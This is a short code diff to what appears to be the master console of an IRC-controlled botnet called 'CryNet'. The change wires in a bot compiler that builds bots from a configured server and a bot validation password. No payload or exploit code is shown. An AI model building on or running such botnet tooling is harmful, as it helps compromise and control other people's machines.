@@ -2,6 +2,7 @@ import sys
 import json
 from colorama import init, Cursor
 
+from BotCompiler import BotCompiler
 from MasterIrcClient import MasterIrcClient
 #from CommandCenter import CommandCenter
 
@@ -83,7 +84,10 @@ def startIrcConsole():
         ircClient.run()
 
 def startBotCompilation():
-    print("----------------------CryNet Bot Compilation----------------------") 
+    global config
+    compiler = BotCompiler(config.get("server"), config.get("botValidatePass"))
+    compiler.start()
+    #compiler.clean()
 
 def displayMenu():
     print("~~~~~~~~~~~~~~~~~~~~~~~CryNet Master Options~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
